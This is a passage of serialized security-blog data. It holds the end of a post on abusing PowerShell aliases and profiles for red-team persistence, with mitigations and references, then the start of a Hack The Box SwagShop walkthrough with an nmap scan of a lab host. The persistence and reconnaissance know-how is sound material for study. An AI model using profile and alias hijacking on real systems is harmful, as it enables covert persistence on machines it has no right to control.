seen, both profiles have been modified and if we do Get-Alias everything has been shimmed. Now when we type an alias it will run our shimmed version of it :)\"), mdx(\"p\", null, \"The script can be found here:\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/NotoriousRebel/Remapper\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Remapper\")), mdx(\"h3\", {\n    \"id\": \"mitigation\"\n  }, \"Mitigation\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Monitoring of PowerShell Profile locations to look for either creation of the file or someone writing to it.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Checking what aliases are defined as\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Avoiding the use of aliases; although, if you dig into PowerShell\\u2019s\\nsource code you will see some commands use aliases!\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Avoiding Powershell Profiles all together using the flag -No Profile when using PowerShell.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Powershell Logging \"))), mdx(\"h3\", {\n    \"id\": \"whats-next\"\n  }, \"What\\u2019s Next?\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Looking into shimming aliases for Command Prompt sessions\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Looking into CLR hooking instead of PowerShell profiles.\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Researching the shimming of built-in PowerShell functions.\"))), mdx(\"h3\", {\n    \"id\": \"closing-thoughts\"\n  }, \"Closing Thoughts\"), mdx(\"p\", null, \"The concept of realiasing things in PowerShell is very fascinating, I have not seen too much research on it and would be curious to see just how far you can take it.\\nOverall, I hope this blog post gets people interested in the topic and can serve to be another neat trick for red teamers. While also giving blue teamers something else to watch out for.\"), mdx(\"h2\", {\n    \"id\": \"references\"\n  }, \"References\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://attack.mitre.org/techniques/T1504/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://attack.mitre.org/techniques/T1504/\"))), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_aliases?view=powershell-6\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_aliases?view=powershell-6\"))), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6\"))), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-alias?view=powershell-6\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-alias?view=powershell-6\"))), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-alias?view=powershell-6\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-alias?view=powershell-6\"))), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/remove-alias?view=powershell-6\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/remove-alias?view=powershell-6\")))));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAOABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAAAwACBP/EABYBAQEBAAAAAAAAAAAAAAAAAAEDBP/aAAwDAQACEAMQAAABbfO2eoxw/wD/xAAZEAADAQEBAAAAAAAAAAAAAAAAAQIRAyH/2gAIAQEAAQUC54ipHJFeO8HTZ//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8BP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABcQAQADAAAAAAAAAAAAAAAAABAAETH/2gAIAQEABj8CluH/xAAXEAADAQAAAAAAAAAAAAAAAAAAAREh/9oACAEBAAE/IZBDYS3mEIhFgaU//9oADAMBAAIAAwAAABC0L//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QP//EABURAQEAAAAAAAAAAAAAAAAAAAEQ/9oACAECAQE/EBAn/8QAGhABAQEBAQEBAAAAAAAAAAAAAREAMSFBcf/aAAgBAQABPxA8jZVW6Jp70c5V+MNlJA1hLw+7iG//2Q==","aspectRatio":1.462885738115096,"src":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/58fe7/Treasure.jpg","srcSet":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/e0f30/Treasure.jpg 236w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/86afd/Treasure.jpg 472w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/58fe7/Treasure.jpg 944w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/02748/Treasure.jpg 1416w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/5c241/Treasure.jpg 1888w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/1fd0c/Treasure.jpg 3508w","srcWebp":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/99fbb/Treasure.webp","srcSetWebp":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/77392/Treasure.webp 236w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/1f177/Treasure.webp 472w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/99fbb/Treasure.webp 944w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/4a492/Treasure.webp 1416w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/b0b8f/Treasure.webp 1888w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/e7d05/Treasure.webp 3508w","sizes":"(max-width: 944px) 100vw, 944px"},"regular":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAOABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAAAwACBP/EABYBAQEBAAAAAAAAAAAAAAAAAAEDBP/aAAwDAQACEAMQAAABbfO2eoxw/wD/xAAZEAADAQEBAAAAAAAAAAAAAAAAAQIRAyH/2gAIAQEAAQUC54ipHJFeO8HTZ//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8BP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABcQAQADAAAAAAAAAAAAAAAAABAAETH/2gAIAQEABj8CluH/xAAXEAADAQAAAAAAAAAAAAAAAAAAAREh/9oACAEBAAE/IZBDYS3mEIhFgaU//9oADAMBAAIAAwAAABC0L//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QP//EABURAQEAAAAAAAAAAAAAAAAAAAEQ/9oACAECAQE/EBAn/8QAGhABAQEBAQEBAAAAAAAAAAAAAREAMSFBcf/aAAgBAQABPxA8jZVW6Jp70c5V+MNlJA1hLw+7iG//2Q==","aspectRatio":1.462885738115096,"src":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/1dc0b/Treasure.jpg","srcSet":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/3a5ce/Treasure.jpg 163w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/05730/Treasure.jpg 327w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/1dc0b/Treasure.jpg 653w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/f72c7/Treasure.jpg 980w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/6e4a3/Treasure.jpg 1306w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/1fd0c/Treasure.jpg 3508w","srcWebp":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/0acdf/Treasure.webp","srcSetWebp":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/ac59e/Treasure.webp 163w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/7660b/Treasure.webp 327w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/0acdf/Treasure.webp 653w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/75470/Treasure.webp 980w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/68d47/Treasure.webp 1306w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/e7d05/Treasure.webp 3508w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAOABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAAAwACBP/EABYBAQEBAAAAAAAAAAAAAAAAAAEDBP/aAAwDAQACEAMQAAABbfO2eoxw/wD/xAAZEAADAQEBAAAAAAAAAAAAAAAAAQIRAyH/2gAIAQEAAQUC54ipHJFeO8HTZ//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8BP//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABcQAQADAAAAAAAAAAAAAAAAABAAETH/2gAIAQEABj8CluH/xAAXEAADAQAAAAAAAAAAAAAAAAAAAREh/9oACAEBAAE/IZBDYS3mEIhFgaU//9oADAMBAAIAAwAAABC0L//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQMBAT8QP//EABURAQEAAAAAAAAAAAAAAAAAAAEQ/9oACAECAQE/EBAn/8QAGhABAQEBAQEBAAAAAAAAAAAAAREAMSFBcf/aAAgBAQABPxA8jZVW6Jp70c5V+MNlJA1hLw+7iG//2Q==","aspectRatio":1.462885738115096,"src":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/eaa58/Treasure.jpg","srcSet":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/5a3ee/Treasure.jpg 114w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/41f8f/Treasure.jpg 229w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/eaa58/Treasure.jpg 457w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/c309b/Treasure.jpg 686w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/e3008/Treasure.jpg 914w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/1fd0c/Treasure.jpg 3508w","srcWebp":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/15384/Treasure.webp","srcSetWebp":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/31fce/Treasure.webp 114w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/e3e25/Treasure.webp 229w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/15384/Treasure.webp 457w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/0258d/Treasure.webp 686w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/64ea2/Treasure.webp 914w,\n/static/f01c2cbdd0b1401f5d81812b37c6fdf2/e7d05/Treasure.webp 3508w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/f01c2cbdd0b1401f5d81812b37c6fdf2/0ff54/Treasure.jpg"}}},"authors":[{"authorsPage":true,"bio":"Core developer for theHarvester \nand enjoys red teaming Windows.\n","id":"7971a4b2-8c15-5c5b-86fd-173de5dac0d9","name":"NotoriousRebel","featured":false,"social":[{"url":"https://github.com/NotoriousRebel"},{"url":"https://twitter.com/NotoriousRebel1"}],"slug":"/authors/NotoriousRebel","avatar":{"small":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAQDAgX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABrjkos4bjyQbg/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEEP/aAAgBAQABBQIPpKdiMjE1tF6Bo9S+sgB//8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPwEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPwEf/8QAHRAAAQIHAAAAAAAAAAAAAAAAIQABAhAREiAykf/aAAgBAQAGPwJyVFdXsyy1w//EABwQAQADAAIDAAAAAAAAAAAAAAEAESExQVFhgf/aAAgBAQABPyGgGxzD8Vto5aineSuMvMtY09sFBhzKSLP/2gAMAwEAAgADAAAAENsoff/EABcRAQADAAAAAAAAAAAAAAAAAAEAEBH/2gAIAQMBAT8QJhf/xAAWEQADAAAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8QK//EAB0QAQACAgIDAAAAAAAAAAAAAAEAESExQVFxgfD/2gAIAQEAAT8Qx7JC2msS6kiAGs9l/ZgldMv9QZliIREN+PUDUxyJBIasmo7xG1SdpP/Z","aspectRatio":1,"src":"/static/c908e3ef9d0ce562bad340430706f232/fa1ea/rebel_avatar.jpg","srcSet":"/static/c908e3ef9d0ce562bad340430706f232/afb2b/rebel_avatar.jpg 13w,\n/static/c908e3ef9d0ce562bad340430706f232/7c20e/rebel_avatar.jpg 25w,\n/static/c908e3ef9d0ce562bad340430706f232/fa1ea/rebel_avatar.jpg 50w,\n/static/c908e3ef9d0ce562bad340430706f232/03612/rebel_avatar.jpg 75w,\n/static/c908e3ef9d0ce562bad340430706f232/61cdf/rebel_avatar.jpg 100w,\n/static/c908e3ef9d0ce562bad340430706f232/836e2/rebel_avatar.jpg 480w","srcWebp":"/static/c908e3ef9d0ce562bad340430706f232/e7b2c/rebel_avatar.webp","srcSetWebp":"/static/c908e3ef9d0ce562bad340430706f232/58718/rebel_avatar.webp 13w,\n/static/c908e3ef9d0ce562bad340430706f232/74aad/rebel_avatar.webp 25w,\n/static/c908e3ef9d0ce562bad340430706f232/e7b2c/rebel_avatar.webp 50w,\n/static/c908e3ef9d0ce562bad340430706f232/ed320/rebel_avatar.webp 75w,\n/static/c908e3ef9d0ce562bad340430706f232/66016/rebel_avatar.webp 100w,\n/static/c908e3ef9d0ce562bad340430706f232/35871/rebel_avatar.webp 480w","sizes":"(max-width: 50px) 100vw, 50px"},"medium":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAQDAgX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABrjkos4bjyQbg/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEEP/aAAgBAQABBQIPpKdiMjE1tF6Bo9S+sgB//8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPwEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPwEf/8QAHRAAAQIHAAAAAAAAAAAAAAAAIQABAhAREiAykf/aAAgBAQAGPwJyVFdXsyy1w//EABwQAQADAAIDAAAAAAAAAAAAAAEAESExQVFhgf/aAAgBAQABPyGgGxzD8Vto5aineSuMvMtY09sFBhzKSLP/2gAMAwEAAgADAAAAENsoff/EABcRAQADAAAAAAAAAAAAAAAAAAEAEBH/2gAIAQMBAT8QJhf/xAAWEQADAAAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8QK//EAB0QAQACAgIDAAAAAAAAAAAAAAEAESExQVFxgfD/2gAIAQEAAT8Qx7JC2msS6kiAGs9l/ZgldMv9QZliIREN+PUDUxyJBIasmo7xG1SdpP/Z","aspectRatio":1,"src":"/static/c908e3ef9d0ce562bad340430706f232/61cdf/rebel_avatar.jpg","srcSet":"/static/c908e3ef9d0ce562bad340430706f232/7c20e/rebel_avatar.jpg 25w,\n/static/c908e3ef9d0ce562bad340430706f232/fa1ea/rebel_avatar.jpg 50w,\n/static/c908e3ef9d0ce562bad340430706f232/61cdf/rebel_avatar.jpg 100w,\n/static/c908e3ef9d0ce562bad340430706f232/59538/rebel_avatar.jpg 150w,\n/static/c908e3ef9d0ce562bad340430706f232/fd013/rebel_avatar.jpg 200w,\n/static/c908e3ef9d0ce562bad340430706f232/836e2/rebel_avatar.jpg 480w","srcWebp":"/static/c908e3ef9d0ce562bad340430706f232/66016/rebel_avatar.webp","srcSetWebp":"/static/c908e3ef9d0ce562bad340430706f232/74aad/rebel_avatar.webp 25w,\n/static/c908e3ef9d0ce562bad340430706f232/e7b2c/rebel_avatar.webp 50w,\n/static/c908e3ef9d0ce562bad340430706f232/66016/rebel_avatar.webp 100w,\n/static/c908e3ef9d0ce562bad340430706f232/d9b14/rebel_avatar.webp 150w,\n/static/c908e3ef9d0ce562bad340430706f232/6b183/rebel_avatar.webp 200w,\n/static/c908e3ef9d0ce562bad340430706f232/35871/rebel_avatar.webp 480w","sizes":"(max-width: 100px) 100vw, 100px"},"large":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAQDAgX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABrjkos4bjyQbg/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEEP/aAAgBAQABBQIPpKdiMjE1tF6Bo9S+sgB//8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPwEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPwEf/8QAHRAAAQIHAAAAAAAAAAAAAAAAIQABAhAREiAykf/aAAgBAQAGPwJyVFdXsyy1w//EABwQAQADAAIDAAAAAAAAAAAAAAEAESExQVFhgf/aAAgBAQABPyGgGxzD8Vto5aineSuMvMtY09sFBhzKSLP/2gAMAwEAAgADAAAAENsoff/EABcRAQADAAAAAAAAAAAAAAAAAAEAEBH/2gAIAQMBAT8QJhf/xAAWEQADAAAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8QK//EAB0QAQACAgIDAAAAAAAAAAAAAAEAESExQVFxgfD/2gAIAQEAAT8Qx7JC2msS6kiAGs9l/ZgldMv9QZliIREN+PUDUxyJBIasmo7xG1SdpP/Z","aspectRatio":1,"src":"/static/c908e3ef9d0ce562bad340430706f232/ec46e/rebel_avatar.jpg","srcSet":"/static/c908e3ef9d0ce562bad340430706f232/a2637/rebel_avatar.jpg 82w,\n/static/c908e3ef9d0ce562bad340430706f232/15203/rebel_avatar.jpg 164w,\n/static/c908e3ef9d0ce562bad340430706f232/ec46e/rebel_avatar.jpg 328w,\n/static/c908e3ef9d0ce562bad340430706f232/836e2/rebel_avatar.jpg 480w","srcWebp":"/static/c908e3ef9d0ce562bad340430706f232/5a48e/rebel_avatar.webp","srcSetWebp":"/static/c908e3ef9d0ce562bad340430706f232/2d087/rebel_avatar.webp 82w,\n/static/c908e3ef9d0ce562bad340430706f232/29d87/rebel_avatar.webp 164w,\n/static/c908e3ef9d0ce562bad340430706f232/5a48e/rebel_avatar.webp 328w,\n/static/c908e3ef9d0ce562bad340430706f232/35871/rebel_avatar.webp 480w","sizes":"(max-width: 328px) 100vw, 328px"}}}],"basePath":"/","slug":"/Using-and-Abusing-Aliases-with-PowerShell","id":"31f00fd2-fe08-554a-8fb0-8e5e4bca4201","title":"Using and Abusing Aliases with PowerShell","mailchimp":false,"next":[{"id":"f40b36c8-8b4e-5be7-9e35-b4dbf89d41e4","slug":"/SwagShop-Hack-The-Box-Writeup","secret":false,"title":"SwagShop Hack The Box Writeup","author":"Bad3r","date":"September 28th, 2019","dateForSEO":"2019-09-28T00:00:00.000Z","timeToRead":2,"excerpt":"Complete walkthrough for SwagShop on Hack The Box","subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"SwagShop Hack The Box Writeup\",\n  \"author\": \"Bad3r\",\n  \"date\": \"2019-09-28T00:00:00.000Z\",\n  \"hero\": \"./images/SwagShop_Hack_The_Box_Walkthrough.jpg\",\n  \"excerpt\": \"Complete walkthrough for SwagShop on Hack The Box\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"p\", null, \"This post documents the complete walkthrough of SwagShop, an active vulnerable VM created by \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://www.hackthebox.eu/home/users/profile/1\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"ch4p\"), \" and hosted at \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://www.hackthebox.eu/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Hack The Box\")), mdx(\"table\", null, mdx(\"thead\", {\n    parentName: \"table\"\n  }, mdx(\"tr\", {\n    parentName: \"thead\"\n  }, mdx(\"th\", _extends({\n    parentName: \"tr\"\n  }, {\n    \"align\": null\n  }), \"Description\"))), mdx(\"tbody\", {\n    parentName: \"table\"\n  }, mdx(\"tr\", {\n    parentName: \"tbody\"\n  }, mdx(\"td\", _extends({\n    parentName: \"tr\"\n  }, {\n    \"align\": null\n  }), mdx(\"em\", {\n    parentName: \"td\"\n  }, \"SwagShop\"), \" is a retired GNU/Linux eCommerce web server using an outdated/unpatched version of \", mdx(\"inlineCode\", {\n    parentName: \"td\"\n  }, \"Magento\"), \" with known vulnerabilities and exploits. The Linux system allows the \", mdx(\"inlineCode\", {\n    parentName: \"td\"\n  }, \"Apache\"), \" user to run a sudo command with no password required, allowing privilege escalation to root.\")))), mdx(\"h3\", {\n    \"id\": \"❯-information-gathering\"\n  }, \"\\u276F Information Gathering\"), mdx(\"p\", null, \"Starting with a \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Nmap\"), \" scan\"), mdx(\"p\", null, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://notes.secbytes.net/information-gathering/nmap\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Nmap cheat sheet\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {}), \"\\u2022\\u279C nmap -sV -sC -oA namp 10.10.10.140\\n...\\n \\u2514> PORT   STATE SERVICE VERSION \\n    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) \\n    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) \\n    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu)) \\n    |_http-server-header: Apache/2.4.18 (Ubuntu) \\n    |_http-title: Home page Service Info: OS: Linux; \\n\")), mdx(\"p\", null, \"From the SSH flag, we guessed this box to be \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://launchpad.net/ubuntu/+source/openssh/1:7.2p2-4ubuntu2.8\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Ubuntu Xenial\"), \" and \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"Nmap\"), \" finds \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"80/tcp\"), \" open.\"), mdx(\"h3\", {\n    \"id\": \"❯-web-pages-enumeration\"\n  }, \"\\u276F Web Pages Enumeration\"), mdx(\"p\", null, \"Going to \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"http://10.10.10.140\"), \" in the browser\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"683px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"62.22547584187408%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": 